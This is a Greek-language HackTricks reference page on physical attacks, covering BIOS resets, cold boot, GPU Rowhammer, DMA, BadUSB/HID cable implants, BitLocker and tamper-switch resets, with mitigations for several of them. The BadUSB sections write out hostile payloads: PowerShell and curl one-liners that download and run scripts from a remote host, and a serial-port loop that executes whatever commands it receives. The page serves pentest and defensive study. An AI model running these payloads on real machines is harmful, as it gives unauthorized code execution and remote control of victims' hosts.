# Φυσικές Επιθέσεις

{{#include ../banners/hacktricks-training.md}}

Για εντοπισμό διεπαφών σε επίπεδο πλακέτας, σειριακές κονσόλες, πρόσβαση σε flash, side channels και glitching, χρησιμοποιήστε το [Hardware Hacking](hardware-hacking/README.md) και τα κεφάλαιά του για συγκεκριμένες διεπαφές. Αυτή η σελίδα καλύπτει επιθέσεις που απαιτούν φυσική πρόσβαση σε ολόκληρο το σύστημα.

## Ανάκτηση κωδικού BIOS και ασφάλεια συστήματος

Οι ρυθμίσεις firmware παλαιότερων PC μπορεί να επαναφερθούν αποσυνδέοντας την μπαταρία CMOS ή χρησιμοποιώντας έναν τεκμηριωμένο βραχυκυκλωτήρα clear-CMOS. Ο απαιτούμενος χρόνος χωρίς τροφοδοσία εξαρτάται από την πλακέτα, ενώ οι σύγχρονοι κωδικοί ή τα κλειδιά UEFI μπορεί να βρίσκονται σε μη πτητική flash, σε ενσωματωμένο ελεγκτή ή σε συσκευή ασφαλείας και, επομένως, να διατηρηθούν μετά την αφαίρεση της μπαταρίας. Συμβουλευτείτε το εγχειρίδιο της πλακέτας ή του service πριν βραχυκυκλώσετε ακίδες· αυτή η διαδικασία μπορεί επίσης να ακυρώσει τις μετρήσεις TPM και να ενεργοποιήσει την ανάκτηση κρυπτογράφησης δίσκου.

Σε παλαιότερα συστήματα x86, εργαλεία όπως τα **killCMOS** και **CmosPwd** μπορούν να επιθεωρήσουν ή να τροποποιήσουν ρυθμίσεις που είναι αποθηκευμένες στο CMOS, από ένα bootable περιβάλλον. Το CmosPwd αναγνωρίζει μορφές κωδικών από ένα τεκμηριωμένο σύνολο παλαιότερων οικογενειών BIOS και μπορεί να δημιουργήσει αντίγραφα ασφαλείας, να επαναφέρει ή να διαγράψει/τερματίσει την κατάσταση CMOS· οι δημοσιευμένες εκδόσεις του προορίζονται για παλαιότερα περιβάλλοντα DOS/Windows, Linux, FreeBSD και NetBSD.<sup>[[18]](#references)</sup> Αυτά τα βοηθητικά προγράμματα δεν αφαιρούν γενικά κωδικούς UEFI και απαιτούν επαρκή πρόσβαση στο υλικό/firmware.

Ορισμένα firmware laptop εμφανίζουν έναν κωδικό πρόκλησης συγκεκριμένο για τον κατασκευαστή έπειτα από αρκετές αποτυχημένες προσπάθειες εισαγωγής κωδικού. Βάσεις δεδομένων όπως το [bios-pw.org](https://bios-pw.org) μπορούν να υπολογίσουν κωδικούς ανάκτησης παλαιού τύπου για ορισμένα μοντέλα, αλλά πολλά συστήματα εφαρμόζουν κλείδωμα χωρίς κωδικό πρόκλησης από τον οποίο μπορεί να υπολογιστεί κωδικός. Θεωρείτε κάθε κωδικό που παράγεται ειδικό για το συγκεκριμένο μοντέλο και αποφύγετε να εξαντλήσετε μετρητές προσπαθειών που δεν μηδενίζονται.

### Ασφάλεια UEFI

Για σύγχρονα συστήματα **UEFI**, το CHIPSEC μπορεί να ελέγξει τις προστασίες των μεταβλητών Secure Boot. Ξεκινήστε με τον έλεγχο που δεν τροποποιεί το σύστημα παρακάτω· η προαιρετική λειτουργία `-a modify` επιχειρεί σκόπιμα να καταστρέψει μεταβλητές και πρέπει να χρησιμοποιείται μόνο σε ανακτήσιμο εργαστηριακό σύστημα. Το ίδιο το CHIPSEC προειδοποιεί ότι το προνομιούχο πρόγραμμα οδήγησης και η πρόσβαση χαμηλού επιπέδου στο υλικό δεν είναι κατάλληλα για endpoints παραγωγής.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

## Ανάλυση RAM και επιθέσεις Cold Boot

Η DRAM δεν χάνει αμέσως κάθε bit όταν σταματά η ανανέωση. Ο ρυθμός φθοράς διαφέρει σημαντικά ανάλογα με την τεχνολογία της μονάδας και τη θερμοκρασία· η ψύξη μπορεί να διατηρήσει χρήσιμα δεδομένα για πολύ περισσότερο χρόνο σε σχέση με έναν κύκλο διακοπής και επαναφοράς τροφοδοσίας χωρίς ψύξη. Μια επίθεση cold-boot επανεκκινεί γρήγορα το σύστημα σε ένα μικρό περιβάλλον απόκτησης ή μεταφέρει μια ψυχόμενη μονάδα, καταγράφει την ακατέργαστη μνήμη και ανακατασκευάζει κρυπτογραφικά κλειδιά παρά τη φθορά των bit. Ένα εργαλείο αντιγραφής δίσκου δεν είναι αυτομάτως εργαλείο απεικόνισης φυσικής μνήμης, ενώ το Volatility αναλύει μια καταγραφή αντί να την αποκτά· χρησιμοποιήστε ένα επικυρωμένο εργαλείο απόκτησης, κατάλληλο για την πλατφόρμα.<sup>[[12]](#references)</sup>

## GPU Rowhammer εναντίον πινάκων σελίδων

Οι σύγχρονες επιθέσεις GPU Rowhammer είναι πολύ πιο χρήσιμες όταν στοχεύουν **μεταδεδομένα εικονικής μνήμης GPU** αντί για συνηθισμένα buffers. Πρόσφατη έρευνα σε **GPU NVIDIA Ampere με GDDR6** δείχνει ότι ένας εισβολέας που εκτελεί μη προνομιούχο κώδικα CUDA μπορεί να δημιουργήσει μοτίβα hammering ειδικά για GPU, να χρησιμοποιήσει **memory massaging** για να τοποθετήσει δομές σελιδοποίησης σε ευάλωτες γραμμές και, στη συνέχεια, να αναστρέψει bit στον **πίνακα σελίδων τελευταίου επιπέδου** ή σε έναν ενδιάμεσο **κατάλογο σελίδων**. Μόλις αλλοιωθεί μία καταχώριση μετάφρασης, ο εισβολέας μπορεί να αποκτήσει **αυθαίρετη ανάγνωση/εγγραφή μνήμης GPU** και κατόπιν να περάσει σε παραβίαση του host.<sup>[[1]](#references)[[2]](#references)</sup>

### Μοτίβο εκμετάλλευσης

1. **Καταγράψτε τις γραμμές που μπορούν να δεχτούν hammering** στη GDDR6 και δημιουργήστε μοτίβα hammering που λαμβάνουν υπόψη την ανανέωση και δεν είναι ομοιόμορφα, παρακάμπτοντας τις μετριαστικές δικλίδες εντός της DRAM.
2. **Χειριστείτε τις εκχωρήσεις GPU** ώστε ο driver να τοποθετεί τις δομές μετάφρασης σελίδων σε ευάλωτες φυσικές θέσεις, αντί να τις διατηρεί στην προεπιλεγμένη προστατευμένη περιοχή. Στην πράξη, αυτό μπορεί να σημαίνει εξάντληση της περιοχής πινάκων σελίδων χαμηλής μνήμης και δημιουργία μεγάλου αριθμού αραιών αντιστοιχίσεων UVM με ελεγχόμενα βήματα.
3. **Αναστρέψτε bit σε μεταδεδομένα μετάφρασης**, όπως bit **PFN** ή σχετικά με το aperture, μέσα σε μια καταχώριση πίνακα σελίδων/καταλόγου σελίδων, ώστε η εικονική σελίδα που ελέγχει ο εισβολέας να επιλύεται σε σελίδες πινάκων σελίδων, αυθαίρετη μνήμη GPU ή αντιστοιχίσεις συστήματος ορατές στον host.
4. Επαναχρησιμοποιήστε την πλαστογραφημένη αντιστοίχιση για να ξαναγράψετε πρόσθετες καταχωρίσεις μετάφρασης και να κλιμακώσετε την επίθεση σε **αυθαίρετη ανάγνωση/εγγραφή μνήμης GPU** σε διαφορετικά GPU contexts.

### Μετάβαση στον host και μετριασμοί

- Με **απενεργοποιημένο IOMMU**, οι πλαστογραφημένες αντιστοιχίσεις system-aperture μπορούν να εκθέσουν αυθαίρετη **φυσική μνήμη host** στην GPU, μετατρέποντας το primitive της GPU σε πλήρη παραβίαση του host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Το **GDDRHammer** στοχεύει καταχωρίσεις πινάκων σελίδων τελευταίου επιπέδου, ενώ το **GeForge** δείχνει ότι μπορεί να είναι ευκολότερη η αλλοίωση ενός επιπέδου καταλόγου σελίδων, επειδή η αναστροφή ενός bit μπορεί να ανακατευθύνει ένα μεγαλύτερο υποδέντρο μετάφρασης. Μην θεωρείτε ότι μόνο ένα επίπεδο σελιδοποίησης είναι κρίσιμο για την ασφάλεια.<sup>[[1]](#references)[[2]](#references)</sup>
- Το **IOMMU** εξακολουθεί να έχει σημασία, καθώς αποκλείει την άμεση πρόσβαση σε αυθαίρετη μνήμη host που χρησιμοποιούν τα GDDRHammer/GeForge, αλλά **δεν αποτελεί πλήρη μετριασμό**. Το **GPUBreach** παρουσιάζει ένα δεύτερο στάδιο μετάβασης, όπου ο εισβολέας αλλοιώνει buffers CPU που είναι εγγράψιμα από την GPU και ανήκουν στον driver και, στη συνέχεια, ενεργοποιεί σφάλματα ασφάλειας μνήμης του driver NVIDIA για να αποκτήσει primitive εγγραφής στον kernel και **root shell**, ακόμη κι όταν είναι ενεργοποιημένο το IOMMU.<sup>[[3]](#references)</sup>
- Το **ECC σε επίπεδο συστήματος** αποτελεί πρακτικό μέτρο ενίσχυσης της ασφάλειας σε υποστηριζόμενες GPU workstation/server. Οι consumer GPU χωρίς ECC προσφέρουν ασθενέστερη επιφάνεια άμυνας.<sup>[[4]](#references)</sup>
- Αυτές οι επιθέσεις δεν είναι καθαρά θεωρητικές: το **GeForge** ανέφερε **1.171** αναστροφές bit σε RTX 3060 και **202** σε RTX A6000, αριθμός επαρκής για τη δημιουργία μιας λειτουργικής αλυσίδας κλιμάκωσης προνομίων στον host.<sup>[[2]](#references)[[9]](#references)</sup>

## Επιθέσεις Direct Memory Access (DMA)

Για offline τροποποίηση UEFI IFR/NVRAM που μπορεί να υποβαθμίσει την επιβολή IOMMU πριν από την εκκίνηση και να ενεργοποιήσει μια αλυσίδα DMA στα Windows, δείτε:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

Το **Inception** επιδεικνύει **απόκτηση και τροποποίηση μνήμης μέσω DMA** από διεπαφές όπως το FireWire και πρώιμες διαμορφώσεις Thunderbolt, συμπεριλαμβανομένων ιστορικών υπογραφών παράκαμψης σύνδεσης. Δεν είναι απλώς «αναποτελεσματικό απέναντι στα Windows 10»: η δυνατότητα εκμετάλλευσης εξαρτάται από τη διεπαφή, το build του στόχου, την πολιτική IOMMU, την κατάσταση κλειδώματος και το αν υποστηρίζεται και είναι ενεργοποιημένη η Windows Kernel DMA Protection. Τα Windows 10 έκδοση 1803 και νεότερες εισήγαγαν την Kernel DMA Protection σε συμβατές πλατφόρμες, αλλάζοντας σημαντικά την επιφάνεια επίθεσης.<sup>[[13]](#references)[[14]](#references)</sup>

## Live CD/USB για πρόσβαση στο σύστημα

Σε τόμο Windows χωρίς κρυπτογράφηση ή ήδη ξεκλείδωτο, ένα offline περιβάλλον μπορεί να αντικαταστήσει αρχεία προσβασιμότητας, όπως τα **sethc.exe** ή **Utilman.exe**, με το **cmd.exe**, παρέχοντας μια γραμμή εντολών SYSTEM όταν εκτελεστεί η αντίστοιχη συντόμευση στην οθόνη σύνδεσης. Εργαλεία όπως το **chntpw** μπορούν να τροποποιήσουν τα δεδομένα λογαριασμών του τοπικού SAM. Αυτές οι μέθοδοι δεν παρακάμπτουν έναν κλειδωμένο τόμο BitLocker και μπορούν να καταστρέψουν διαπιστευτήρια που προστατεύονται με DPAPI/EFS· διατηρήστε αντίγραφα εγκληματολογικής ανάλυσης και αντίγραφα ασφαλείας.

Το **Kon-Boot** είναι εμπορικό εργαλείο παράκαμψης ελέγχου ταυτότητας κατά την εκκίνηση, για υποστηριζόμενες διαμορφώσεις Windows/macOS. Η συμβατότητα εξαρτάται από το λειτουργικό σύστημα, τη λειτουργία firmware, το Secure Boot και τη ρύθμιση κρυπτογράφησης δίσκου· δεν αποκρυπτογραφεί έναν κλειδωμένο τόμο BitLocker.<sup>[[10]](#references)</sup>

## Διαχείριση χαρακτηριστικών ασφαλείας των Windows

### Συντομεύσεις εκκίνησης και ανάκτησης

- Τα **Delete/Supr**, F2, F10 ή κάποιο άλλο πλήκτρο του κατασκευαστή μπορεί να ανοίξει τη ρύθμιση firmware.
- Το **F8** ανοίγει τις επιλογές σύνθετης εκκίνησης παλαιότερων εκδόσεων Windows μόνο σε διαμορφώσεις όπου αυτή η διαδρομή παραμένει ενεργοποιημένη· η πρόσβαση στην τρέχουσα λειτουργία ανάκτησης διαφέρει.
- Το παρατεταμένο πάτημα του **Shift** μπορεί να αποτρέψει την αυτόματη σύνδεση στα Windows σε ορισμένες διαμορφώσεις, αν και οι ρυθμίσεις πολιτικής/μητρώου μπορούν να απενεργοποιήσουν αυτή τη συμπεριφορά.<sup>[[17]](#references)</sup>

### Συσκευές BAD USB

Συσκευές όπως το **USB Rubber Ducky** και οι πλακέτες Teensy μπορούν να αναγνωριστούν ως έμπιστα πληκτρολόγια HID και να εισαγάγουν προκαθορισμένα πλήκτρα. Το payload έχει αρχικά τα προνόμια και την πρόσβαση στην επιφάνεια εργασίας της συνδεδεμένης συνεδρίας· οι προτροπές UAC, το κλείδωμα οθόνης, η διάταξη πληκτρολογίου, ο χρονισμός και η πολιτική USB των endpoint εξακολουθούν να το περιορίζουν.<sup>[[15]](#references)</sup>

Τα προγραμματιζόμενα περιφερειακά μπορούν επίσης να επιτεθούν σε parsers του host kernel και να συντονίσουν πολλές συσκευές USB για heap grooming και αποκάλυψη πληροφοριών:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### Volume Shadow Copy

Προνόμια administrator ή backup μπορούν να χρησιμοποιηθούν για τη δημιουργία shadow copy ή την αποθήκευση των registry hives, ώστε να αποκτηθούν κλειδωμένα αρχεία όπως τα **SAM** και **SYSTEM**. Αυτή είναι τεχνική συλλογής μετά την παραβίαση, όχι παράκαμψη προνομίων, και τα σχετικά συμβάντα πρέπει να συσχετίζονται με ενέργειες `diskshadow`/VSS και εξαγωγής registry hive.

## Τεχνικές εμφύτευσης BadUSB / HID

### Gadget HID Android με ενεργοποίηση μέσω NFC

Ένα rooted τηλέφωνο Android μπορεί να λειτουργήσει ως προγραμματιζόμενο πληκτρολόγιο USB μόνο όταν ο USB controller και ο kernel του παρέχουν **υποστήριξη USB gadget/HID**. Σε συμβατές συσκευές, το Kali NetHunter παρέχει προφίλ gadget μέσω του **USB Arsenal**. Μια άλλη επιλογή είναι το [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), το οποίο δημιουργεί λειτουργίες gadget ConfigFS και μπορεί να παρέχει character devices πληκτρολογίου/ποντικιού, όπως τα `/dev/hidg0` και `/dev/hidg1`. Το εργαλείο δημιουργεί μόνο το endpoint του gadget· μια ξεχωριστή διεργασία πρέπει να γράψει αναφορές HID σε αυτό. Η πρόσβαση root δεν μπορεί να αντισταθμίσει την απουσία ConfigFS, υποστήριξης HID gadget ή κατάλληλου USB Device Controller από τον kernel.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Αυτό το endpoint μπορεί να συνδυαστεί με Android NFC ως φυσικό trigger. Η εφαρμογή [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) διαβάζει το UID μιας ετικέτας, το μετατρέπει στην αναμενόμενη αναπαράστασή του, ελέγχει μια τοπική whitelist και, αν υπάρξει αντιστοιχία, στέλνει μια διαμορφωμένη ακολουθία πλήκτρων τύπου Rubber Ducky. Ο συνδεδεμένος host βλέπει συνηθισμένη εισαγωγή πληκτρολογίου και δεν χρειάζεται λογισμικό NFC.<sup>[[22]](#references)[[24]](#references)</sup>

Επαληθεύστε την αναγνώριση της συσκευής και τη διάταξη πληκτρολογίου σε έναν κενό επεξεργαστή κειμένου πριν χρησιμοποιήσετε συντομεύσεις ή εντολές. Ένα ακίνδυνο payload είναι:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Σημαντικά όρια εμπιστοσύνης:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- Μια **λίστα επιτρεπόμενων UID είναι μέσο ταυτοποίησης, όχι αυθεντικοποίησης**. Τα UID είναι δημόσια, ενώ ορισμένοι τύποι token ή emulators επιτρέπουν την κλωνοποίηση ή την πλαστοπροσωπία. Ένα αντιγραμμένο UID που επιτρέπεται ακολουθεί την ίδια διαδρομή δρομολόγησης με το αρχικό token.
- Το module **NfcScreenOff** του Magisk διορθώνει την υπηρεσία NFC, ώστε να συμπεριφέρεται σαν η οθόνη να είναι ενεργή και ξεκλείδωτη. Αν το τηλέφωνο είναι ήδη συνδεδεμένο σε έναν host, αυτό μπορεί να επιτρέψει σε κάποιον να ενεργοποιήσει το payload χωρίς να ξεκλειδώσει το τηλέφωνο.
- Οι κωδικοί πρόσβασης, τα API tokens και οι εντολές που είναι αποθηκευμένα στο payload αποτελούν ανακτήσιμα μυστικά σε συσκευή με root ή ξεκλείδωτο bootloader. Η πληκτρολόγηση κωδικού πρόσβασης μέσω HID είναι αυτοματοποίηση επαναχρησιμοποιούμενου κωδικού, όχι αυθεντικοποίηση χωρίς κωδικό πρόσβασης.
- Το HID injection ενεργεί με τα δικαιώματα του ενεργού desktop και εξαρτάται από το στοιχείο που έχει εστίαση, τον χρονισμό και τη διάταξη πληκτρολογίου του host. Απαιτήστε πρόσφατη επιβεβαίωση από τον χρήστη πριν από την εκτέλεση ευαίσθητων ενεργειών, αποφύγετε την αποθήκευση προνομιούχων μυστικών σε scripts και χρησιμοποιήστε authenticator με κρυπτογραφικό challenge-response για πραγματική αυθεντικοποίηση.

### Εμφυτεύματα καλωδίων με Wi-Fi

- Εμφυτεύματα βασισμένα σε ESP32-S3, όπως το **Evil Crow Cable Wind**, κρύβονται μέσα σε καλώδια USB-A→USB-C ή USB-C↔USB-C, εμφανίζονται ως πληκτρολόγιο USB και εκθέτουν τη στοίβα C2 μέσω Wi-Fi. Ο χειριστής χρειάζεται μόνο να τροφοδοτήσει το καλώδιο από τον host του θύματος, να δημιουργήσει ένα hotspot με όνομα `Evil Crow Cable Wind` και κωδικό πρόσβασης `123456789` και να μεταβεί στη διεύθυνση [http://cable-wind.local/](http://cable-wind.local/) (ή στη διεύθυνση DHCP του) για πρόσβαση στην ενσωματωμένη διεπαφή HTTP.<sup>[[8]](#references)</sup>
- Το περιβάλλον εργασίας του browser παρέχει καρτέλες για *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* και *Config*. Τα αποθηκευμένα payloads επισημαίνονται ανά OS, οι διατάξεις πληκτρολογίου αλλάζουν δυναμικά και οι συμβολοσειρές VID/PID μπορούν να τροποποιηθούν ώστε να μιμούνται γνωστά περιφερειακά.
- Επειδή το C2 βρίσκεται μέσα στο καλώδιο, ένα τηλέφωνο μπορεί να προετοιμάσει payloads, να ενεργοποιήσει την εκτέλεσή τους και να διαχειριστεί διαπιστευτήρια Wi-Fi χωρίς να χρησιμοποιήσει το δίκτυο του οργανισμού—χρήσιμο για φυσικές εισβολές σύντομης διάρκειας.

### Payloads AutoExec με επίγνωση του OS

- Οι κανόνες AutoExec συνδέουν ένα ή περισσότερα payloads με άμεση εκτέλεση μετά την απαρίθμηση USB. Το εμφύτευμα εκτελεί ελαφριά αναγνώριση του OS και επιλέγει το κατάλληλο script.
- Παράδειγμα ροής εργασίας:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) ή `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Επειδή η εκτέλεση γίνεται χωρίς επίβλεψη, η απλή αντικατάσταση ενός καλωδίου φόρτισης μπορεί να εξασφαλίσει αρχική πρόσβαση τύπου «plug-and-pwn» στο πλαίσιο του συνδεδεμένου χρήστη.

### Απομακρυσμένο shell μέσω Wi-Fi TCP με εκκίνηση από HID

1. **Εκκίνηση με keystroke:** Ένα αποθηκευμένο payload ανοίγει μια κονσόλα και επικολλά έναν βρόχο που εκτελεί ό,τι λαμβάνει από τη νέα συσκευή USB serial. Μια ελάχιστη παραλλαγή για Windows είναι:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Καλωδιακή γέφυρα:** Το implant διατηρεί ανοιχτό το κανάλι USB CDC, ενώ το ESP32-S3 εκκινεί ένα TCP client (Python script, Android APK ή εκτελέσιμο για desktop) που συνδέεται πίσω στον operator. Τα byte που πληκτρολογούνται στη συνεδρία TCP προωθούνται στον παραπάνω σειριακό βρόχο, παρέχοντας remote command execution ακόμη και σε air-gapped hosts. Η έξοδος είναι περιορισμένη, γι’ αυτό οι operators εκτελούν συνήθως εντολές στα τυφλά (δημιουργία λογαριασμών, προετοιμασία πρόσθετων εργαλείων κ.λπ.).

### Επιφάνεια ενημέρωσης HTTP OTA

- Η τεκμηριωμένη διεπαφή του Evil Crow Cable Wind εκθέτει ένα endpoint ενημέρωσης firmware χωρίς έλεγχο ταυτότητας στο `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Οι χειριστές πεδίου μπορούν να κάνουν hot-swap λειτουργιών (π.χ., να κάνουν flash το firmware του USB Army Knife) κατά τη διάρκεια της επιχείρησης, χωρίς να ανοίξουν το καλώδιο, επιτρέποντας στο implant να αποκτήσει νέες δυνατότητες ενώ παραμένει συνδεδεμένο στον υπολογιστή-στόχο.

## Παράκαμψη της κρυπτογράφησης BitLocker

Μια εξουσιοδοτημένη εγκληματολογική απόκτηση δεδομένων από ένα σύστημα που λειτουργεί ή λειτούργησε πρόσφατα μπορεί να περιέχει το volume master key του BitLocker ή σχετικό υλικό κλειδιών, όσο ο τόμος είναι ξεκλείδωτος. Εμπορικά εργαλεία όπως τα Elcomsoft Forensic Disk Decryptor και Passware Kit Forensic μπορούν να αναζητήσουν σε υποστηριζόμενα memory images, αρχεία αδρανοποίησης ή crash dumps, αλλά η επιτυχία δεν είναι εγγυημένη. Οι σύγχρονες εκδόσεις των Windows κρυπτογραφούν επίσης τα crash dumps όταν είναι ενεργοποιημένο το BitLocker, ενώ ένας αποθηκευμένος κωδικός ανάκτησης 48 ψηφίων είναι διαφορετικό τεχνούργημα από ένα κλειδί τόμου που βρίσκεται στη μνήμη.<sup>[[12]](#references)[[16]](#references)</sup>

## Κοινωνική μηχανική για την προσθήκη κλειδιού ανάκτησης

Ένας επιτιθέμενος που πείθει έναν διαχειριστή να εκτελέσει εντολές διαχείρισης του BitLocker μπορεί να προσθέσει ένα recovery-password, external-key ή άλλο protector και στη συνέχεια να το υποκλέψει. Ένας κωδικός ανάκτησης δεν μπορεί να είναι μια αυθαίρετη συμβολοσειρά από μηδενικά: οι αριθμητικοί κωδικοί ανάκτησης του BitLocker έχουν επικυρωμένη μορφή 48 ψηφίων. Η σχετική σύνταξη για εξουσιοδοτημένη διαχείριση είναι `manage-bde -protectors -add C: -recoverypassword`· για να εμφανίσετε τους protectors που προστέθηκαν, χρησιμοποιήστε `manage-bde -protectors -get C:`. Παρακολουθείτε τις προσθήκες protectors και διασφαλίζετε ότι το νέο υλικό ανάκτησης αποθηκεύεται μόνο σε εγκεκριμένες τοποθεσίες.<sup>[[16]](#references)</sup>

## Εκμετάλλευση διακοπτών παραβίασης πλαισίου / συντήρησης για επαναφορά του BIOS στις εργοστασιακές ρυθμίσεις

Πολλοί σύγχρονοι φορητοί υπολογιστές και επιτραπέζιοι υπολογιστές μικρού μεγέθους διαθέτουν **διακόπτη παραβίασης πλαισίου**, τον οποίο παρακολουθούν ο Embedded Controller (EC) και το firmware του BIOS/UEFI. Ενώ ο κύριος σκοπός του διακόπτη είναι να ενεργοποιεί μια ειδοποίηση όταν ανοίγει η συσκευή, ορισμένοι κατασκευαστές υλοποιούν μια **μη τεκμηριωμένη συντόμευση ανάκτησης**, η οποία ενεργοποιείται όταν ο διακόπτης αλλάξει κατάσταση με συγκεκριμένο μοτίβο.<sup>[[5]](#references)[[6]](#references)</sup>

### Πώς λειτουργεί η επίθεση

1. Ο διακόπτης συνδέεται σε μια **διακοπή GPIO** του EC.
2. Το firmware που εκτελείται στον EC παρακολουθεί το **χρονισμό και τον αριθμό των πατημάτων**.
3. Όταν αναγνωριστεί ένα προκαθορισμένο μοτίβο, ο EC καλεί μια ρουτίνα *mainboard-reset* που **διαγράφει τα περιεχόμενα της NVRAM/CMOS του συστήματος**.
4. Κατά την επόμενη εκκίνηση, τα επηρεαζόμενα μοντέλα φορτώνουν την επαναφερμένη κατάσταση του firmware. Ανάλογα με τον κατασκευαστή και την έκδοση, η κατάσταση που διαγράφεται μπορεί να περιλαμβάνει κωδικό πρόσβασης supervisor, προσαρμοσμένες ρυθμίσεις εκκίνησης ή εγγεγραμμένα κλειδιά Secure Boot· η κατάσταση TPM και οι επιπτώσεις στην κρυπτογράφηση δίσκου πρέπει να αξιολογούνται ξεχωριστά.

> Η επαναφορά του firmware μπορεί να επαναφέρει τις επιλογές εκκίνησης από εξωτερικά μέσα, αλλά **δεν** αποκρυπτογραφεί τον αποθηκευτικό χώρο. Το BitLocker ή άλλο σύστημα πλήρους κρυπτογράφησης δίσκου μπορεί να ζητήσει ανάκτηση μετά από αλλαγές στο TPM/firmware και να συνεχίσει να προστατεύει τον εσωτερικό δίσκο χωρίς κλειδί ανάκτησης.<sup>[[16]](#references)</sup>

### Παράδειγμα από τον πραγματικό κόσμο – φορητός υπολογιστής Framework 13

Η συντόμευση ανάκτησης για το Framework 13 (11ης/12ης/13ης γενιάς) είναι:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Μετά τον δέκατο κύκλο, το EC ορίζει μια σημαία που δίνει εντολή στο BIOS να διαγράψει τη NVRAM στην επόμενη επανεκκίνηση. Η διαδικασία διαρκεί περίπου 40 δευτερόλεπτα και απαιτεί **μόνο ένα κατσαβίδι**.<sup>[[5]](#references)</sup>

### Γενική διαδικασία εκμετάλλευσης

1. Ενεργοποιήστε ή αναστείλετε και επαναφέρετε τον στόχο, ώστε να εκτελείται το EC.
2. Αφαιρέστε το κάτω κάλυμμα για να αποκαλύψετε τον διακόπτη εισβολής/συντήρησης.
3. Επαναλάβετε το μοτίβο εναλλαγής που αντιστοιχεί στον κατασκευαστή (συμβουλευτείτε την τεκμηρίωση ή φόρουμ, ή κάντε reverse-engineer το firmware του EC).
4. Επανασυναρμολογήστε και επανεκκινήστε τη συσκευή και, στη συνέχεια, ελέγξτε ποιες ρυθμίσεις firmware και ποια διαπιστευτήρια άλλαξαν πράγματι.
5. Αν έχετε εξουσιοδότηση και είναι διαθέσιμη η εξωτερική εκκίνηση, εκκινήστε ένα ελεγχόμενο live image. Μόλις ξεκλειδωθεί νόμιμα ένας εσωτερικός τόμος (ή αν δεν ήταν ποτέ κρυπτογραφημένος), το live περιβάλλον μπορεί να αποκτήσει διαπιστευτήρια και δεδομένα ή να εξετάσει το EFI System Partition. Η τροποποίηση αυτού του partition για την εγκατάσταση ενός EFI implant είναι μόνιμη και ιδιαίτερα παρεμβατική, ενώ εξακολουθεί να περιορίζεται από τα Secure Boot, measured boot, την προστασία εγγραφής του firmware και την παρακολούθηση endpoint. Ο κρυπτογραφημένος αποθηκευτικός χώρος παραμένει απρόσιτος χωρίς το κλειδί ή το υλικό ανάκτησης.

### Ανίχνευση και μετριασμός

* Καταγράφετε τα συμβάντα εισβολής στο chassis στην κονσόλα διαχείρισης του OS και συσχετίζετέ τα με απρόσμενες επαναφορές του BIOS.
* Χρησιμοποιείτε **σφραγίδες ασφαλείας που αποκαλύπτουν παραβίαση** στις βίδες και στα καλύμματα, ώστε να εντοπίζεται το άνοιγμα της συσκευής.
* Φυλάσσετε τις συσκευές σε **χώρους με ελεγχόμενη φυσική πρόσβαση**· θεωρείτε ότι η φυσική πρόσβαση ισοδυναμεί με πλήρη παραβίαση.
* Όπου είναι διαθέσιμη, απενεργοποιείτε τη λειτουργία «maintenance switch reset» του κατασκευαστή ή απαιτείτε πρόσθετη κρυπτογραφική εξουσιοδότηση για τις επαναφορές της NVRAM.

## Κρυφή έγχυση IR κατά αισθητήρων εξόδου χωρίς επαφή

### Χαρακτηριστικά αισθητήρα
- Οι συνηθισμένοι αισθητήρες «wave-to-exit» συνδυάζουν έναν εκπομπό LED κοντινού IR με μια μονάδα δέκτη τύπου τηλεχειριστηρίου τηλεόρασης, η οποία αναφέρει λογικό high μόνο αφού λάβει πολλαπλούς παλμούς (~4–10) στη σωστή φέρουσα συχνότητα (≈30 kHz).<sup>[[7]](#references)</sup>
- Ένα πλαστικό κάλυμμα εμποδίζει τον εκπομπό και τον δέκτη να είναι στραμμένοι απευθείας ο ένας προς τον άλλον, οπότε ο ελεγκτής υποθέτει ότι κάθε επικυρωμένη φέρουσα προέρχεται από κοντινή ανάκλαση και ενεργοποιεί ένα ρελέ που ανοίγει το ηλεκτρικό κλείστρο της πόρτας.
- Μόλις ο ελεγκτής θεωρήσει ότι υπάρχει στόχος, συχνά αλλάζει το περίβλημα διαμόρφωσης της εξερχόμενης εκπομπής, αλλά ο δέκτης συνεχίζει να δέχεται κάθε ριπή που ταιριάζει στη φιλτραρισμένη φέρουσα.

### Ροή επίθεσης
1. **Καταγράψτε το προφίλ εκπομπής** – συνδέστε έναν logic analyser στις ακίδες του ελεγκτή για να καταγράψετε τόσο τις κυματομορφές πριν από τον εντοπισμό όσο και εκείνες μετά από αυτόν, οι οποίες οδηγούν το εσωτερικό LED IR.
2. **Αναπαράγετε μόνο την κυματομορφή «μετά τον εντοπισμό»** – αφαιρέστε ή αγνοήστε τον εργοστασιακό εκπομπό και οδηγήστε ένα εξωτερικό LED IR με το μοτίβο που κανονικά παράγεται μετά την ενεργοποίηση. Επειδή ο δέκτης ενδιαφέρεται μόνο για τον αριθμό και τη συχνότητα των παλμών, θεωρεί τη διαμορφωμένη φέρουσα ως γνήσια ανάκλαση και ενεργοποιεί τη γραμμή του ρελέ.
